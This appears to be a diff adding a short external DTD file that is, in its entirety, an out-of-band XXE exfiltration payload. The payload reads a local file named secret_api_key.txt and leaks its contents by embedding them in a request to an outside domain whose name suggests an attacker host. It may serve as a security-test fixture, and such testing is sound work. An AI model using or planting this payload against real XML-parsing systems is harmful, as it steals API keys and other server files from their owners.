@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///secret_api_key.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://%file;.ondehensikter.no/'>">
+%eval;
+%exfiltrate;
